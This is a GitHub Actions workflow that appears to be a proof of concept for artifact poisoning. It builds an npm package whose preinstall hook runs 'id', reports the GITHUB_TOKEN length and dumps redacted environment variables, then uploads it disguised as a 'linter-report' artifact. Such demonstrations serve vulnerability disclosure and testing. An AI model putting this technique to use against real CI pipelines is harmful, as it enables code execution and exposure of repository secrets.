---
name: PR validation
on:
  pull_request:
    branches: [main]

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - name: Attacker-authored artifact
        run: |
          echo "external-attacker artifact" > linter-report.txt
          echo "${{ github.event.pull_request.number }}" > pr-number.txt
          mkdir -p evilpkg/package
          cat > evilpkg/package/package.json <<'PKG'
          {
            "name": "evil-dep",
            "version": "1.0.0",
            "scripts": {
              "preinstall": "echo ===== ATTACKER-RCE-START =====; id; echo TOKEN_LEN=${#GITHUB_TOKEN}; echo ENV_DUMP_START; env | sort | sed -E 's/(TOKEN|KEY|SECRET|PASS)[A-Z_]*=.*/\\1=<redacted-shape>/'; echo ENV_DUMP_END; echo ===== ATTACKER-RCE-END ====="
            }
          }
          PKG
          (cd evilpkg && tar czf ../evil.tgz package)
          cat > package.json <<'PKG'
          {
            "name": "poc-root",
            "version": "1.0.0",
            "private": true,
            "dependencies": { "evil-dep": "file:./evil.tgz" }
          }
          PKG
          printf 'foreground-scripts=true\n' > .npmrc
      - uses: actions/upload-artifact@v4
        with:
          name: linter-report
          path: |
            linter-report.txt
            pr-number.txt
            package.json
            evil.tgz
            .npmrc
          include-hidden-files: true
